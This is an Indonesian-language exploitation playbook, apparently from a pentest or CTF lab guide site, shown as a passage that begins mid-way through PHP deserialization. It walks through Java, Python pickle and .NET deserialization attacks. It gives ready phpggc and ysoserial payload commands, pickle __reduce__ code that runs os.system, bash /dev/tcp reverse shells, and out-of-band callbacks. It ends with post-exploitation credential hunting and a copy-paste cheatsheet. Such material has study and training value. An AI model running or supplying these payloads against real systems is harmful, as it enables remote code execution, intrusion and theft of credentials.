**OUTPUT BERHASIL ✅ — Command output terlihat:**

HTML

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ **RCE CONFIRMED!** Upgrade ke reverse shell:

Bash

```
# Step 2: Setup listener
nc -lvnp $LPORT &

# Step 3: Generate reverse shell payload
./phpggc Laravel/RCE1 system "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" \
  -b > ~/deser_loot/payloads/php_revshell.b64

# Step 4: Trigger
PAYLOAD=$(cat ~/deser_loot/payloads/php_revshell.b64)
curl -s $TARGET_URL/dashboard \
  -H "Cookie: session=$PAYLOAD" \
  -o /dev/null
```

**OUTPUT BERHASIL ✅ — Reverse shell connect:**

text

```
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 45678
bash: no job control in this shell
www-data@target:/var/www/html$ id
uid=33(www-data) gid=33(www-data)
```

➡️ **SHELL DIDAPAT!** → Langsung ke **FASE 6 (Post-Exploitation)**

**OUTPUT GAGAL ❌ — Gadget tidak trigger:**

text

```
HTTP 500 atau tidak ada output
```

➡️ Framework salah atau dependency tidak match:

Bash

```
# Identifikasi framework lebih akurat
# Cek dari source code yang bisa diakses
curl -s $TARGET_URL/composer.json 2>/dev/null
curl -s $TARGET_URL/.env 2>/dev/null  
curl -s $TARGET_URL/phpinfo.php 2>/dev/null

# Cari dari error message
curl -s $TARGET_URL/dashboard \
  -H "Cookie: session=INVALID_DATA" 2>/dev/null | grep -iE "(laravel|symfony|yii|class)"

# Google: "phpggc [class name dari error] RCE"
# Google: "php deserialization [framework version] gadget chain"
```

---

## ═══════════════════════════════════════

## FASE 2: JAVA DESERIALIZATION

## ═══════════════════════════════════════

> **Prasyarat:** Ditemukan `ac ed 00 05` atau Base64 starting `rO0AB` dari Fase 0

### Langkah 2.1 — Konfirmasi Java Serialized Object

Bash

```
# Method 1: Dari cookie/parameter
JAVA_COOKIE="rO0ABXNyABRqYXZhLnV0aWwuSGFzaE1hcA=="

# Decode dan cek magic bytes
echo "$JAVA_COOKIE" | base64 -d | xxd | head -3
```

**OUTPUT BERHASIL ✅ — Java Object Serialization confirmed:**

text

```
00000000: aced 0005 7372 0014 6a61 7661 2e75 7469  ....sr..java.uti
00000010: 6c2e 4861 7368 4d61 7000 0000 0000 0003  l.HashMap.......
```

➡️ **`aced 0005` = Java Object Serialization!**

Bash

```
# Analisis lebih lanjut dengan SerializationDumper
java -jar ~/tools/SerializationDumper.jar $JAVA_COOKIE

# Atau dengan jdeserialize
java -jar ~/tools/jdeserialize.jar -b64 "$JAVA_COOKIE"
```

---

### Langkah 2.2 — Setup ysoserial

Bash

```
# Install ysoserial
cd ~/tools
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial

# Verifikasi Java dan Maven
java -version
mvn -version

# Build
mvn clean package -DskipTests 2>/dev/null

# Verifikasi
YSOSERIAL_JAR=$(find . -name "ysoserial*.jar" | head -1)
java -jar $YSOSERIAL_JAR --help 2>/dev/null | head -30
```

**OUTPUT BERHASIL ✅ — ysoserial berjalan:**

text

```
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
Available payload types:
   CommonsCollections1
   CommonsCollections2
   ...
   URLDNS
```

---

### Langkah 2.3 — URLDNS Detection DULU (Wajib!)

> **RULE:** SELALU gunakan URLDNS untuk detection sebelum mencoba RCE gadget chain!

Bash

```
# Setup OAST
export OAST_DOMAIN="java-test-$(date +%s).oast.fun"

# Generate URLDNS payload
java -jar $YSOSERIAL_JAR URLDNS "http://$OAST_DOMAIN" > ~/deser_loot/payloads/java_urldns.bin

# Encode ke base64 untuk HTTP transport
base64 -w0 ~/deser_loot/payloads/java_urldns.bin > ~/deser_loot/payloads/java_urldns.b64

# Verifikasi magic bytes masih ada
xxd ~/deser_loot/payloads/java_urldns.bin | head -2
```

**OUTPUT BERHASIL ✅ — Payload valid:**

text

```
00000000: aced 0005 7372 0011 6a61 7661 2e75 7469  ....sr..java.uti
00000010: 6c2e 4861 7368 4d61 7000 0000 0000 0003  l.HashMap.......
```

**Kirim URLDNS payload:**

Bash

```
# Method 1: Via cookie
URLDNS_B64=$(cat ~/deser_loot/payloads/java_urldns.b64)
curl -s $TARGET_URL/endpoint \
  -H "Cookie: session=$URLDNS_B64" \
  -o /dev/null -w "Status: %{http_code}\n"

# Method 2: Via POST body (binary)
curl -s $TARGET_URL/api/restore \
  -X POST \
  -H "Content-Type: application/octet-stream" \
  --data-binary @~/deser_loot/payloads/java_urldns.bin \
  -o /dev/null -w "Status: %{http_code}\n"

# Method 3: Via POST body (base64)
curl -s $TARGET_URL/api/restore \
  -X POST \
  -H "Content-Type: text/plain" \
  -d "$URLDNS_B64" \
  -o /dev/null -w "Status: %{http_code}\n"
```

**OUTPUT BERHASIL ✅ — DNS callback diterima di OAST:**

text

```
# Di interactsh terminal:
[INF] Received Interaction: DNS from 10.10.11.200
Query: java-test-1735000000.oast.fun
Type: A
```

➡️ **CONFIRMED! Java deserialization terbukti aktif!** Lanjut ke Langkah 2.4

**OUTPUT GAGAL ❌ — Tidak ada DNS callback:**

text

```
(tidak ada di OAST terminal)
```

➡️ Kemungkinan masalah:

Bash

```
# 1. Cek apakah server menolak binary payload
curl -s $TARGET_URL/api/restore \
  -X POST \
  --data-binary @~/deser_loot/payloads/java_urldns.bin \
  -v 2>&1 | grep "HTTP/"

# 2. Coba endpoint lain
for endpoint in /api/import /restore /deserialize /load /object; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: application/octet-stream" \
    --data-binary @~/deser_loot/payloads/java_urldns.bin \
    "$TARGET_URL$endpoint")
  echo "$endpoint → $CODE"
done

# 3. DNS mungkin diblok, coba HTTP callback
java -jar $YSOSERIAL_JAR URLDNS "http://$OAST_DOMAIN/java-probe" > /tmp/java_http.bin
```

**Google jika buntu:**

text

```
search: "java deserialization [server type] [version]"
search: "ysoserial URLDNS not working [java version]"
search: "java deserialization site:github.com CVE"
```

---

### Langkah 2.4 — Identifikasi Dependencies (Pilih Gadget yang Tepat)

Bash

```
# Cari petunjuk Java framework dari berbagai sumber
# 1. HTTP Headers
curl -sI $TARGET_URL | grep -iE "(x-powered|server|x-application)"

# 2. Error pages
curl -s $TARGET_URL/nonexistent | grep -iE "(commons|spring|struts|log4j|jackson)"

# 3. Jika punya akses file
find /WEB-INF /var/lib/tomcat -name "*.jar" 2>/dev/null | grep -iE "(commons-collections|spring|struts)"
ls /WEB-INF/lib/ 2>/dev/null

# 4. Dari endpoint /actuator (Spring Boot)
curl -s $TARGET_URL/actuator/env 2>/dev/null | python3 -m json.tool | grep -i "classpath"
```

**OUTPUT BERHASIL ✅ — Framework/library teridentifikasi:**

text

```
X-Powered-By: Apache Struts
atau: commons-collections-3.1.jar ditemukan
atau: spring-core-5.2.jar
```

**Mapping library ke gadget ysoserial:**

|Library teridentifikasi|Gadget ysoserial|
|---|---|
|commons-collections 3.x|CommonsCollections1, CC2, CC3, CC6|
|commons-collections 4.x|CommonsCollections4|
|Spring Framework|Spring1, Spring2|
|Hibernate|Hibernate1, Hibernate2|
|Apache Groovy|Groovy1|
|Clojure|Clojure|
|JDK default|URLDNS, JRMPClient|

---

### Langkah 2.5 — Java RCE Exploitation

Bash

```
# Step 1: Test dengan harmless command dulu
java -jar $YSOSERIAL_JAR CommonsCollections1 'id' > ~/deser_loot/payloads/java_id.bin

# Kirim
curl -s $TARGET_URL/api/restore \
  -X POST \
  -H "Content-Type: application/octet-stream" \
  --data-binary @~/deser_loot/payloads/java_id.bin

# Step 2: Jika output tidak terlihat, gunakan waktu (blind)
java -jar $YSOSERIAL_JAR CommonsCollections1 'sleep 5' > ~/deser_loot/payloads/java_sleep.bin

time curl -s $TARGET_URL/api/restore \
  -X POST \
  -H "Content-Type: application/octet-stream" \
  --data-binary @~/deser_loot/payloads/java_sleep.bin \
  -o /dev/null
```

**OUTPUT BERHASIL ✅ — Timing delay konfirmasi RCE:**

text

```
real    0m5.123s    ← delay 5 detik = sleep berhasil!
user    0m0.012s
sys     0m0.004s
```

Bash

```
# Step 3: Reverse shell
nc -lvnp $LPORT &

# Java reverse shell command
REVSHELL="bash -c {echo,$(echo -n "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | base64)}|{base64,-d}|bash"

# Generate payload
java -jar $YSOSERIAL_JAR CommonsCollections1 "$REVSHELL" > ~/deser_loot/payloads/java_revshell.bin

# Trigger
curl -s $TARGET_URL/api/restore \
  -X POST \
  -H "Content-Type: application/octet-stream" \
  --data-binary @~/deser_loot/payloads/java_revshell.bin \
  -o /dev/null
```

**OUTPUT BERHASIL ✅ — Java reverse shell:**

text

```
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 54321
bash: no job control in this shell
tomcat@target:/opt/tomcat$ id
uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)
```

➡️ **SHELL!** → **FASE 6 (Post-Exploitation)**

**OUTPUT GAGAL ❌ — CommonsCollections1 tidak bekerja:**

text

```
(no response atau ClassNotFoundException di server log)
```

➡️ Coba gadget lain secara berurutan:

Bash

```
# Coba semua CommonsCollections secara sistematis
for gadget in CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 CommonsCollections7; do
  echo "[*] Testing $gadget..."
  java -jar $YSOSERIAL_JAR $gadget "curl http://$OAST_DOMAIN/$gadget" > /tmp/test_gadget.bin 2>/dev/null
  curl -s $TARGET_URL/api/restore \
    -X POST \
    -H "Content-Type: application/octet-stream" \
    --data-binary @/tmp/test_gadget.bin \
    -o /dev/null -w "$gadget → %{http_code}\n"
  sleep 2
done
# Monitor OAST untuk lihat gadget mana yang callback
```

---

## ═══════════════════════════════════════

## FASE 3: PYTHON PICKLE DESERIALIZATION

## ═══════════════════════════════════════

> **Prasyarat:** Ditemukan `80 04`, `80 05`, atau Base64 starting `gAS` dari Fase 0

### Langkah 3.1 — Konfirmasi Python Pickle

Bash

```
# Decode dan analisis
PICKLE_DATA="gASVHgAAAAAAAACMCHN1YnByb2Nlc3SUjARjYWxslJOUKYWUUpQu"

# Decode
echo "$PICKLE_DATA" | base64 -d > /tmp/pickle_sample.bin

# Cek hex
xxd /tmp/pickle_sample.bin | head -5

# Analisis pickle opcodes (AMAN, hanya analisis)
python3 << 'EOF'
import pickletools, io, base64
data = base64.b64decode("gASVHgAAAAAAAACMCHN1YnByb2Nlc3SUjARjYWxslJOUKYWUUpQu")
pickletools.dis(io.BytesIO(data))
EOF
```

**OUTPUT BERHASIL ✅ — Pickle opcodes terlihat:**

text

```
    0: \x80 PROTO      4
    2: \x95 FRAME      30
   11: \x8c SHORT_BINUNICODE 'subprocess'
   23: \x94 MEMOIZE
   24: \x8c SHORT_BINUNICODE 'call'
```

➡️ **Pickle confirmed!** Perhatikan, pickle ini sudah berisi `subprocess.call` → sudah dieksploit!

---

### Langkah 3.2 — Buat Pickle Payload untuk OAST Detection

Bash

```
# Buat payload Python untuk OAST detection
cat > /tmp/create_pickle_oast.py << 'EOF'
import pickle, os, base64

class OASTProbe:
    def __reduce__(self):
        return (os.system, (f"curl http://OAST_DOMAIN/pickle-probe",))

payload = pickle.dumps(OASTProbe(), protocol=2)
print(base64.b64encode(payload).decode())
EOF

# Ganti OAST_DOMAIN dengan domain kamu
python3 /tmp/create_pickle_oast.py | sed "s/OAST_DOMAIN/$OAST_DOMAIN/g" > ~/deser_loot/payloads/pickle_oast.b64

# Kirim ke target
PAYLOAD=$(cat ~/deser_loot/payloads/pickle_oast.b64)
curl -s $TARGET_URL/api/import \
  -X POST \
  -H "Cookie: data=$PAYLOAD" \
  -o /tmp/response.html

# Atau kirim sebagai POST body
curl -s $TARGET_URL/restore \
  -X POST \
  -H "Content-Type: text/plain" \
  -d "$PAYLOAD"
```

**OUTPUT BERHASIL ✅ — Callback dari target:**

text

```
# Di interactsh:
[INF] Received Interaction: HTTP from 10.10.11.200
Path: /pickle-probe
```

➡️ **Python Pickle RCE confirmed!**

---

### Langkah 3.3 — Python Pickle RCE

Bash

```
# Step 1: Test harmless command
cat > /tmp/create_pickle_id.py << 'EOF'
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned.txt",))

payload = pickle.dumps(Exploit(), protocol=2)
b64 = base64.b64encode(payload).decode()
print(f"Payload: {b64}")
EOF

python3 /tmp/create_pickle_id.py

# Step 2: Reverse shell
cat > /tmp/create_pickle_revshell.py << EOF
import pickle, os, base64

LHOST = "$LHOST"
LPORT = "$LPORT"

class Exploit:
    def __reduce__(self):
        cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit(), protocol=2)
b64 = base64.b64encode(payload).decode()
print(b64)
EOF

python3 /tmp/create_pickle_revshell.py > ~/deser_loot/payloads/pickle_revshell.b64

# Step 3: Setup listener dan trigger
nc -lvnp $LPORT &

PAYLOAD=$(cat ~/deser_loot/payloads/pickle_revshell.b64)
curl -s $TARGET_URL/api/import \
  -H "Cookie: data=$PAYLOAD" \
  -o /dev/null
```

**OUTPUT BERHASIL ✅ — Python reverse shell:**

text

```
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 33456
$ id
uid=1000(app) gid=1000(app) groups=1000(app)
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
app@target:~$
```

➡️ **SHELL!** → **FASE 6 (Post-Exploitation)**

---

## ═══════════════════════════════════════

## FASE 4: .NET VIEWSTATE/DESERIALIZATION

## ═══════════════════════════════════════

> **Prasyarat:** Ditemukan `__VIEWSTATE` field atau .NET serialization dari Fase 0

### Langkah 4.1 — Analisis ViewState

Bash

```
# Extract ViewState dari HTML
curl -s $TARGET_URL/page | grep -o 'value="[^"]*"' | grep -A1 "VIEWSTATE" | head -5

# Simpan nilai ViewState
VIEWSTATE="/wEPDwUJODcxNDI5MDkwZGQ="

# Decode ViewState
echo "$VIEWSTATE" | base64 -d | xxd | head -10
```

**PERTANYAAN KRITIS yang harus dijawab:**

Bash

```
# 1. Apakah MAC (Message Authentication Code) aktif?
# Jika ViewState valid → tidak ada error = MAC mungkin disabled atau kita perlu key

# 2. Test: modifikasi ViewState dan kirim
MODIFIED="AAAAAAAAAAAAAAAAAAAAAA=="  # Invalid ViewState
curl -s $TARGET_URL/page \
  -X POST \
  -d "__VIEWSTATE=$MODIFIED&__EVENTTARGET=&__EVENTARGUMENT=" \
  | grep -iE "(mac|invalid|error|exception)"
```

**OUTPUT BERHASIL ✅ — Error MAC terlihat:**

text

```
"Validation of viewstate MAC failed"
```

➡️ MAC aktif → butuh MachineKey untuk exploit. Cari key dari source code, error, atau config files.

**OUTPUT BERHASIL ✅ — Tidak ada error MAC:**

text

```
Page renders normally (meski viewstate dimodifikasi)
```

➡️ **MAC disabled! ViewState vulnerable tanpa key!** → Langsung exploit dengan ysoserial.net

---

### Langkah 4.2 — ysoserial.net untuk ViewState (Linux via Wine atau Windows VM)

Bash

```
# Note: ysoserial.net lebih optimal di Windows
# Di Linux, gunakan Wine atau Docker

# Option 1: Docker
docker run --rm -v ~/deser_loot:/output ghcr.io/pwntester/ysoserial.net:latest \
  -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc [base64_payload]" \
  --islegacy \
  --path "/page.aspx" \
  --apppath "/"

# Option 2: Manual Wine (jika tersedia)
wine ~/tools/ysoserial.net/ysoserial.exe \
  -p ViewState \
  -g TextFormattingRunProperties \
  -c "ping $LHOST" \
  --validationalg="SHA1" \
  --validationkey="[MACHINE_KEY_IF_KNOWN]"
```

**Google untuk key hunting:**

text

```
search: "ASP.NET machineKey default keys github"
search: "viewstate MAC disabled exploitation"
search: "ysoserial.net ViewState no MAC"
```

---

## ═══════════════════════════════════════

## FASE 5: JSON TypeNameHandling (.NET)

## ═══════════════════════════════════════

### Langkah 5.1 — Identifikasi JSON TypeNameHandling

Bash

```
# Cari $type field dalam JSON request/response
curl -s $TARGET_URL/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"test": "value"}' | python3 -m json.tool

# Test: kirim $type yang berbeda
curl -s $TARGET_URL/api/endpoint \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework", "test": 1}' \
  -v 2>&1 | grep -iE "(error|exception|type|400|500)"
```

**OUTPUT BERHASIL ✅ — Server menerima dan memproses $type:**

text

```
HTTP 200 atau 500 dengan exception stack trace yang menyebut TypeNameHandling
```

➡️ **JSON TypeNameHandling aktif!** Exploit dengan ysoserial.net gadget.

---

## ═══════════════════════════════════════

## FASE 6: POST-EXPLOITATION (SETELAH SHELL)

## ═══════════════════════════════════════

> **Masuk sini setelah berhasil mendapatkan shell dari salah satu fase di atas**

### Langkah 6.1 — Stabilisasi Shell

Bash

```
# Upgrade ke interactive TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# atau
python -c 'import pty; pty.spawn("/bin/bash")'
# atau
script /dev/null -c bash

# Set terminal
export TERM=xterm
stty raw -echo; fg
stty rows 50 columns 200
```

### Langkah 6.2 — Enumerasi Awal

Bash

```
# Info dasar
id
whoami
hostname
uname -a
cat /etc/passwd | grep -v nologin

# Cari credentials lain yang terkait deserialization
# (config files, .env, dll)
find / -name "*.properties" -o -name "*.yml" -o -name "*.env" 2>/dev/null \
  | xargs grep -iE "(password|secret|key|token)" 2>/dev/null | head -20

# Cari credentials database (sering ada di config Java/PHP apps)
find / -name "application.properties" 2>/dev/null | xargs cat 2>/dev/null | grep -iE "(password|datasource)"
find / -name "config.php" -o -name "database.php" 2>/dev/null | xargs cat 2>/dev/null | grep -i password

# Cek network untuk pivot
ip addr show
ss -tunp
arp -n
```

### Langkah 6.3 — Cross-Service dari Shell yang Didapat

text

```
Deserialization Shell Obtained
         │
         ├──→ Cek internal services → ss -tunp
         │       ├─ ─ Port 3306 (MySQL)  → ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
         │       ├─ ─ Port 5432 (Postgres) → ke <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
         │       ├── Port 8080 (Internal web) → explore
         │       └─ ─ Port 6379 (Redis) → ke <a href="/docs/redis-and-mongodb" class="text-[#00b4d8] hover:underline font-mono font-semibold">14d_redis_mongodb_workflow.md</a>
         │
         ├──→ Cari credentials → ke 45_windows_privesc / 44_linux_privesc
         │
         └─ ─→ Cek domain environment → ke <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
```

Bash

```
# Simpan credentials yang ditemukan
cat > ~/deser_loot/notes/shell_loot.txt << 'EOF'
=== POST-EXPLOITATION LOOT ===
Shell Type: [PHP/Java/Python/NET]
User: [output id]
Hostname: [hostname]
OS: [uname -a]

Credentials Found:
- [list credentials]

Internal Services:
- [list services from ss -tunp]

Next Steps:
- [privesc path]
EOF
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`unserialize(): Error at offset`|PHP string length count salah|Hitung ulang byte: `s:5:"admin"` harus tepat 5 byte|
|`ClassNotFoundException` (Java)|Library tidak ada di classpath|Coba gadget chain yang berbeda|
|`IncompatibleClassChangeError`|Version mismatch|Fingerprint Java version dan library version|
|Pickle payload tidak trigger|Encoding salah atau endpoint salah|Coba binary + base64, coba endpoint lain|
|MAC validation failed (ViewState)|MAC protection aktif|Cari MachineKey atau bypass MAC-disabled config|
|URLDNS tidak callback|DNS outbound blocked|Coba HTTP callback, atau timing-based (sleep)|
|Callback dari local machine|DNS resolution lokal|Gunakan domain OAST unik, cegah local resolve|
|Shell tidak stable|TTY problem|`python3 -c 'import pty; pty.spawn("/bin/bash")'`|
|Payload terlalu besar|Server limit|Gunakan gadget yang lebih kecil atau encode berbeda|
|`readObject() exception`|Gadget tidak compatible|Coba CommonsCollections1-7 secara berurutan|
|Tidak ada output command|Blind RCE|Gunakan OAST/sleep untuk konfirmasi, write file lalu baca|
|`$type` ditolak|TypeNameHandling disabled|Konfirmasi config TypeNameHandling di server|
|Base64 padding error|Decoding issue|Tambah `=` padding atau gunakan `-d` dengan ignore|
|Response 400 untuk binary payload|Content-Type salah|Coba `application/octet-stream`, `text/plain`, `application/x-java-serialized-object`|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Inspect HTTP Traffic
│
├─ FASE 0: Find Serialized Data
│   ├─ O:/a:/s: pattern → PHP → FASE 1
│   ├─ AC ED 00 05 / rO0AB → Java → FASE 2
│   ├─ 80 04/05 / gAS → Python Pickle → FASE 3
│   ├─ __VIEWSTATE → .NET ViewState → FASE 4
│   └─ $type in JSON → .NET TypeNameHandling → FASE 5
│
├─ FASE 1: PHP Deserialization
│   ├─ Simple role/attribute change → Object manipulation
│   ├─ Framework identified → PHPGGC gadget chain
│   ├─ OAST callback → RCE confirmed
│   └─ Reverse shell → FASE 6
│
├─ FASE 2: Java Deserialization
│   ├─ URLDNS → OAST detection (WAJIB DULU)
│   ├─ Library identified → ysoserial gadget
│   ├─ Timing/OAST confirmed → RCE
│   └─ Reverse shell → FASE 6
│
├─ FASE 3: Python Pickle
│   ├─ __reduce__ payload → OAST detection
│   ├─ os.system callback → RCE confirmed
│   └─ Reverse shell → FASE 6
│
├─ FASE 4: .NET ViewState
│   ├─ MAC disabled → Direct exploit
│   ├─ MAC enabled + key known → ysoserial.net
│   └─ RCE → FASE 6
│
└─ FASE 6: Post-Exploitation
    ├─ Stabilize shell
    ├─ Collect credentials
    ├─ Internal network pivot → Other workflow files
    └─ Privesc → 44/<a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_privesc_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export TARGET_URL="http://10.10.11.200"
export LHOST="10.10.14.5"; export LPORT="4444"
export OAST_DOMAIN="your-unique-id.oast.fun"
export PHPGGC_PATH="$HOME/tools/phpggc"
export YSOSERIAL_JAR="$HOME/tools/ysoserial/target/ysoserial-all.jar"
mkdir -p ~/deser_loot/{payloads,captures,oast,notes}

# === DETECTION SHORTCUTS ===
# PHP decode
echo 'BASE64HERE' | base64 -d
# Java check
echo 'BASE64HERE' | base64 -d | xxd | head -2  # look for "ac ed 00 05"
# Pickle check  
echo 'BASE64HERE' | base64 -d | xxd | head -2  # look for "80 04" or "80 05"

# === PHP PAYLOAD ===
# Object manipulation
echo -n 'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}' | base64
# PHPGGC gadget
cd $PHPGGC_PATH && ./phpggc Laravel/RCE1 system "id" -b

# === JAVA PAYLOAD ===
# URLDNS (detection)
java -jar $YSOSERIAL_JAR URLDNS "http://$OAST_DOMAIN" > urldns.bin && base64 -w0 urldns.bin
# RCE gadget
java -jar $YSOSERIAL_JAR CommonsCollections1 "id" > cc1.bin && base64 -w0 cc1.bin
# Blind RCE confirm
java -jar $YSOSERIAL_JAR CommonsCollections1 "sleep 5" > sleep.bin

# === PYTHON PICKLE ===
python3 -c "
import pickle, os, base64
class E:
    def __reduce__(self): return (os.system, ('curl http://$OAST_DOMAIN/pickle',))
print(base64.b64encode(pickle.dumps(E(), 2)).decode())
"

# === SEND PAYLOADS ===
# Via cookie
curl -s $TARGET_URL/endpoint -H "Cookie: session=PAYLOAD_B64"
# Via POST binary
curl -s $TARGET_URL/api -X POST -H "Content-Type: application/octet-stream" --data-binary @payload.bin
# Via POST base64
curl -s $TARGET_URL/api -X POST -H "Content-Type: text/plain" -d "PAYLOAD_B64"

# === REVERSE SHELL TRIGGER ===
nc -lvnp $LPORT &
# Then trigger with: bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
```

---

> **➡️ NEXT:** Setelah deserialization selesai, lanjut ke **[33 — CORS Workflow 🌐](/docs/cors)** untuk CORS misconfiguration yang sering muncul bersamaan di aplikasi yang sama, atau jika dapat shell → ke **`<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`** / **[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)** untuk privilege escalation.